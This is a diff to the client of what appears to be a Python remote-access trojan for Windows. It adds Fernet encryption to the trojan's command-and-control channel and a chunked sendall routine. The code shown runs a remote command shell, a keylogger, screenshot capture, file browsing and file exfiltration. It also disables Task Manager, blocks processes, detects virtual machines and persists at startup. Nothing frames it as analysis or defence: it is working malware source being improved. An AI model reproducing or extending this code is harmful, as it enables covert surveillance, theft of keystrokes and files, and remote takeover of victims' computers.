@@ -3,6 +3,7 @@ import win32api, winerror, win32event
 from shutil import copyfile
 from winreg import *
 from io import StringIO, BytesIO
+from cryptography.fernet import Fernet
 
 strHost = "127.0.0.1"
 # strHost = socket.gethostbyname("")
@@ -87,14 +88,15 @@ def remove_from_startup():
 
 
 def server_connect():
-    global objSocket
+    global objSocket, objEncryptor
     while True:  # infinite loop until socket can connect
         try:
             objSocket = socket.socket()
             objSocket.connect((strHost, intPort))
         except socket.error:
             time.sleep(5)  # wait 5 seconds to try again
-        else: break
+        else:
+            break
 
     arrUserInfo = [socket.gethostname()]
     strPlatform = f"{platform.system()} {platform.release()}"
@@ -104,13 +106,16 @@ def server_connect():
         strPlatform += " (Virtual Machine) "
     arrUserInfo.extend([strPlatform, os.environ["USERNAME"]])
 
-    send(json.dumps(arrUserInfo).encode())
+    objSocket.send(json.dumps(arrUserInfo).encode())
+
+    objEncryptor = Fernet(objSocket.recv(intBuff))
+
 
 # function to receive data
-recv = lambda buffer: objSocket.recv(buffer)
+recv = lambda buffer: objEncryptor.decrypt(objSocket.recv(buffer))
 
 # function to send data
-send = lambda data: objSocket.send(data)
+send = lambda data: objSocket.send(objEncryptor.encrypt(data))
 
 if blnMeltFile: meltFile()
 if blnAddToStartup: startup(True)
@@ -147,8 +152,16 @@ Key = pynput.keyboard.Key
 def recvall(buffer):  # function to receive large amounts of data
     bytData = b""
     while len(bytData) < buffer:
-        bytData += recv(buffer)
-    return bytData
+        bytData += objSocket.recv(buffer)
+    return objEncryptor.decrypt(bytData)
+
+
+def sendall(data):
+    bytEncryptedData = objEncryptor.encrypt(data)
+    intDataSize = len(bytEncryptedData)
+    send(str(intDataSize).encode())
+    time.sleep(0.2)
+    objSocket.send(bytEncryptedData)
 
 
 # vbs message box
@@ -156,7 +169,8 @@ def MessageBox(message):
     strScript = os.path.join(TMP, "m.vbs")
     with open(strScript, "w") as objVBS:
         objVBS.write(f'Msgbox "{message}", vbOKOnly+vbInformation+vbSystemModal, "Message"')
-    subprocess.Popen(["cscript", strScript], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
+    subprocess.Popen(["cscript", strScript], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE,
+                     shell=True)
 
 
 def screenshot():
@@ -169,11 +183,7 @@ def screenshot():
         # Get BytesIO Object Data as bytes
         objPic = objBytes.getvalue()
 
-    # send screenshot information to server
-    send(f"{len(objPic)}".encode())
-    time.sleep(1)
-    # Send Image Data to Server
-    send(objPic)
+    sendall(objPic)
 
 
 def file_browser():
@@ -196,9 +206,7 @@ def file_browser():
         for file in arrFiles:
             strFiles += f"{file}\n"
 
-        send(f"{len(strFiles)}".encode())  # send buffer size
-        time.sleep(0.1)
-        send(strFiles.encode())
+        sendall(strFiles.encode())
 
     else:  # if the user entered an invalid directory
         send(b"Invalid Directory!")
@@ -223,10 +231,8 @@ def receive(data):
         send(b"Target file not found!")
         return
 
-    send(f"{os.path.getsize(data)}".encode())
-    time.sleep(1)
     with open(data, "rb") as objFile:
-        send(objFile.read()) # Send Contents of File
+        sendall(objFile.read())  # Send Contents of File
 
 
 def lock():
@@ -243,6 +249,7 @@ def shutdown(shutdowntype):
 def command_shell():
     strCurrentDir = os.getcwd()
     send(os.getcwdb())
+    bytData = b""
 
     while True:
         strData = recv(intBuff).decode()
@@ -252,7 +259,8 @@ def command_shell():
             break
 
         elif strData[:2].lower() == "cd" or strData[:5].lower() == "chdir":
-            objCommand = subprocess.Popen(strData + " & cd", stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
+            objCommand = subprocess.Popen(strData + " & cd", stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+                                          stdin=subprocess.PIPE, shell=True)
             if objCommand.stderr.read().decode() == "":  # if there is no error
                 strOutput = (objCommand.stdout.read()).decode().splitlines()[0]  # decode and remove new line
                 os.chdir(strOutput)  # change directory
@@ -260,16 +268,14 @@ def command_shell():
                 bytData = f"\n{os.getcwd()}>".encode()  # output to send the server
 
         elif len(strData) > 0:
-            objCommand = subprocess.Popen(strData, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
+            objCommand = subprocess.Popen(strData, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+                                          stdin=subprocess.PIPE, shell=True)
             strOutput = objCommand.stdout.read() + objCommand.stderr.read()  # since cmd uses bytes, decode it
-            bytData = strOutput + b"\n" + os.getcwdb() + b">"
+            bytData = (strOutput + b"\n" + os.getcwdb() + b">")
         else:
             bytData = b"Error!"
 
-        strBuffer = f"{len(bytData)}"
-        send(strBuffer.encode())  # send buffer size
-        time.sleep(0.1)
-        send(bytData)  # send output
+        sendall(bytData)  # send output
 
 
 def python_interpreter():
@@ -293,10 +299,11 @@ def python_interpreter():
                 pass
         finally:
             sys.stdout = old_stdout
+
         if strError:
-            send(strError.encode())
+            sendall(strError.encode())
         else:
-            send(redirected_output.getvalue().encode())
+            sendall(redirected_output.getvalue().encode())
 
 
 def vbs_block_process(process, popup=False):
@@ -322,7 +329,8 @@ def vbs_block_process(process, popup=False):
     with open(strScript, "w") as objVBSFile:
         objVBSFile.write(strVBSCode)
 
-    subprocess.Popen(["cscript", strScript], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)  # run the script
+    subprocess.Popen(["cscript", strScript], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE,
+                     shell=True)  # run the script
 
 
 def disable_taskmgr():
@@ -330,7 +338,8 @@ def disable_taskmgr():
     if not blnDisabled:  # if task manager is already disabled, enable it
         send(b"Enabling ...")
 
-        subprocess.Popen(["taskkill", "/f", "/im", "cscript.exe"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
+        subprocess.Popen(["taskkill", "/f", "/im", "cscript.exe"], stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+                         stdin=subprocess.PIPE, shell=True)
 
         blnDisabled = True
     else:
@@ -369,25 +378,21 @@ def keylogger(option):
                 send(b"error2")
             else:
                 time.sleep(0.2)
-                send(f"{len(strKeyLogs)}".encode())  # send buffer size
-                time.sleep(0.2)
-                send(strKeyLogs.encode())  # send logs
-
+                sendall(strKeyLogs.encode())
                 strKeyLogs = ""  # clear logs
 
 
 def run_command(command):
-    LogOutput = b"\n"
+    bytLogOutput = b"\n"
 
     if len(command) > 0:
-        objCommand = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
-        LogOutput += objCommand.stdout.read() + objCommand.stderr.read()
+        objCommand = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE,
+                                      shell=True)
+        bytLogOutput += objCommand.stdout.read() + objCommand.stderr.read()
     else:
-        LogOutput += b"Error!"
+        bytLogOutput += b"Error!"
 
-    send(f"{len(LogOutput)}".encode())  # send buffer size
-    time.sleep(0.1)
-    send(LogOutput)  # send output
+    sendall(bytLogOutput)
 
 
 while True:
